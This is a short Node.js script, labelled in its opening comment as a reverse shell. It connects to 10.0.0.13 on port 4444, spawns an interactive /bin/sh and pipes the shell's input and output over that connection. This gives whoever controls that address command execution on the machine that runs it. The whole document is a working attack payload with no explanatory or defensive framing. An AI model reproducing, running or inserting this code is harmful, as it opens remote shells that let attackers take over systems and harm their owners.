// Node.js reverse shell
var net = require("net");
var cp = require("child_process");

var sock = net.connect(4444, "10.0.0.13", function () {
    var sh = cp.spawn("/bin/sh", ["-i"]);
    sock.pipe(sh.stdin);
    sh.stdout.pipe(sock);
    sh.stderr.pipe(sock);
});
